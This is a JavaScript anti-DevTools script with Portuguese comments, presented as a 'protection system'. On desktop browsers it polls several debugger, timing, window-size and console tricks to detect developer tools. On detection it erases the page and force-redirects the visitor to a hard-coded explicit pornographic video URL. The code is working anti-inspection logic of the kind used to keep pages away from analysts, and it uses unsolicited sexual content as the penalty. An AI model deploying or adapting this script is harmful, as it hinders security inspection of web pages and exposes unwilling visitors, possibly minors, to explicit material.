/**
 * DETECTOR DE DEVTOOLS - VERSÃO 5.0
 * Detecta abertura do DevTools apenas em dispositivos desktop/notebook
 * Autor: Sistema de Proteção Avançada
 * Data: 2025
 */

(function() {
    'use strict';
    
    // Configuração do redirecionamento
    const REDIRECT_URL = 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao';
    
    // Variáveis de controle
    let protectionActive = true;
    let isDesktop = false;
    let devToolsDetected = false;
    
    /**
     * Verificar se é dispositivo desktop/notebook
     */
    function checkIfDesktop() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Padrões mais abrangentes para desktop/notebook
        const desktopPatterns = [
            'windows', 'macintosh', 'linux', 'x11', 'ubuntu', 'debian', 'fedora'
        ];
        
        // Padrões móveis - se tiver qualquer um desses, é mobile
        const mobilePatterns = [
            'android', 'iphone', 'ipad', 'ipod', 'mobile', 'tablet', 'phone'
        ];
        
        // Verificar se é desktop (tem padrão desktop E não tem padrão mobile)
        const hasDesktopPattern = desktopPatterns.some(pattern => userAgent.includes(pattern));
        const hasMobilePattern = mobilePatterns.some(pattern => userAgent.includes(pattern));
        
        // Verificação adicional: tamanho da tela
        const isLargeScreen = window.innerWidth > 768 && window.innerHeight > 600;
        
        isDesktop = hasDesktopPattern && !hasMobilePattern && isLargeScreen;
        
        if (isDesktop) {
            console.log('[PROTECTION] Dispositivo desktop/notebook detectado - ativando proteção DevTools');
            console.log('[PROTECTION] User Agent:', navigator.userAgent);
            console.log('[PROTECTION] Tela:', window.innerWidth + 'x' + window.innerHeight);
        } else {
            console.log('[PROTECTION] Dispositivo mobile detectado - proteção DevTools desabilitada');
        }
    }
    
    /**
     * Verificar DevTools usando debugger e performance.now()
     */
    function checkDevToolsWithDebugger() {
        try {
            const start = performance.now();
            debugger;
            const end = performance.now();
            
            const timeDiff = end - start;
            
            if (timeDiff > 50) { // Threshold reduzido para 50ms
                console.log('[PROTECTION] DevTools detectado via debugger - tempo:', timeDiff + 'ms');
                handleDevToolsDetection('debugger');
            }
        } catch (e) {
            // Ignorar erros
        }
    }
    
    /**
     * Verificar DevTools usando dimensões da janela
     */
    function checkDevToolsWithDimensions() {
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        const threshold = 120; // Threshold reduzido para 120px
        
        // Se a diferença for maior que 120 pixels, DevTools está aberto
        if (widthDiff > threshold || heightDiff > threshold) {
            console.log('[PROTECTION] DevTools detectado via dimensões - largura:', widthDiff + 'px, altura:', heightDiff + 'px');
            handleDevToolsDetection('dimensions');
        }
    }
    
    /**
     * Verificar DevTools usando console.log
     */
    function checkDevToolsWithConsole() {
        const start = performance.now();
        console.log('%c', 'color: transparent');
        const end = performance.now();
        
        if (end - start > 10) {
            console.log('[PROTECTION] DevTools detectado via console - tempo:', (end - start) + 'ms');
            handleDevToolsDetection('console');
        }
    }
    
    /**
     * Verificar DevTools usando firebug
     */
    function checkDevToolsWithFirebug() {
        if (window.console && (window.console.firebug || window.console.exception)) {
            console.log('[PROTECTION] DevTools detectado via firebug');
            handleDevToolsDetection('firebug');
        }
    }
    
    /**
     * Verificar DevTools usando toString
     */
    function checkDevToolsWithToString() {
        const start = performance.now();
        const devtools = /./;
        devtools.toString = function() {
            handleDevToolsDetection('toString');
        }
        console.log('%c', devtools);
        const end = performance.now();
        
        if (end - start > 10) {
            console.log('[PROTECTION] DevTools detectado via toString - tempo:', (end - start) + 'ms');
            handleDevToolsDetection('toString');
        }
    }
    
    /**
     * Função para lidar com a detecção do DevTools
     */
    function handleDevToolsDetection(method) {
        if (devToolsDetected) return; // Evitar múltiplas execuções
        
        devToolsDetected = true;
        protectionActive = false;
        
        console.log('[PROTECTION] DevTools detectado via método:', method);
        console.log('[PROTECTION] Iniciando bloqueio...');
        
        // Limpar conteúdo da página
        try {
            document.documentElement.innerHTML = '';
            document.body.innerHTML = '';
        } catch (e) {
            // Fallback
            document.write('');
        }
        
        // Redirecionar
        redirectToTarget();
    }
    
    /**
     * Função de redirecionamento
     */
    function redirectToTarget() {
        try {
            window.location.href = REDIRECT_URL;
        } catch (e) {
            // Fallback
            window.location.replace(REDIRECT_URL);
        }
    }
    
    /**
     * Iniciar detecção de DevTools
     */
    function startDevToolsDetection() {
        console.log('[PROTECTION] Iniciando sistema de detecção DevTools...');
        
        // Verificação 1: Debugger a cada 500ms (mais frequente)
        setInterval(() => {
            if (!protectionActive || !isDesktop || devToolsDetected) return;
            checkDevToolsWithDebugger();
        }, 500);
        
        // Verificação 2: Dimensões da janela a cada 1 segundo
        setInterval(() => {
            if (!protectionActive || !isDesktop || devToolsDetected) return;
            checkDevToolsWithDimensions();
        }, 1000);
        
        // Verificação 3: Console a cada 800ms
        setInterval(() => {
            if (!protectionActive || !isDesktop || devToolsDetected) return;
            checkDevToolsWithConsole();
        }, 800);
        
        // Verificação 4: Firebug a cada 2 segundos
        setInterval(() => {
            if (!protectionActive || !isDesktop || devToolsDetected) return;
            checkDevToolsWithFirebug();
        }, 2000);
        
        // Verificação 5: toString a cada 1,5 segundos
        setInterval(() => {
            if (!protectionActive || !isDesktop || devToolsDetected) return;
            checkDevToolsWithToString();
        }, 1500);
        
        // Verificação imediata
        setTimeout(() => {
            if (isDesktop) {
                checkDevToolsWithDebugger();
                checkDevToolsWithDimensions();
                checkDevToolsWithConsole();
            }
        }, 100);
    }
    
    /**
     * Função principal de proteção
     */
    function initProtection() {
        if (!protectionActive) return;
        
        // Verificar se é desktop primeiro
        checkIfDesktop();
        
        // Só ativar proteções se for desktop
        if (isDesktop) {
            startDevToolsDetection();
        }
    }
    
    // Inicializar proteção quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initProtection);
    } else {
        initProtection();
    }
    
    // Verificação adicional no load
    window.addEventListener('load', () => {
        // Verificar novamente se é desktop após carregamento completo
        setTimeout(() => {
            checkIfDesktop();
            if (isDesktop && !devToolsDetected) {
                startDevToolsDetection();
            }
        }, 1000);
    });
    
    // Verificação adicional no resize
    window.addEventListener('resize', () => {
        if (isDesktop && !devToolsDetected) {
            setTimeout(() => {
                checkDevToolsWithDimensions();
            }, 100);
        }
    });
    
})();
